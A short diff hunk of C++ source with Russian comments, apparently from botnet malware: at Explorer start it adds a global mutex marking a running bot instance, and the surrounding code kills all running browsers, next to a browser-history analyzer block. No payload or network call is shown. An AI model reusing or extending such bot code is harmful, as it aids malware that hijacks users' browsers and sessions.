@@ -47,6 +47,10 @@ void ExplorerFirstStart(PEventData Data)
 void ExplorerStart(PEventData Data)
 {
 
+	// Создаём глобальный мьютекс, сигнализирующий о запущенном боте
+	BOT::TryCreateBotInstance();
+
+	// Убиваем все запущенные браузеры
 	KillAllBrowsers();
 
 	#ifdef HistoryAnalizerH
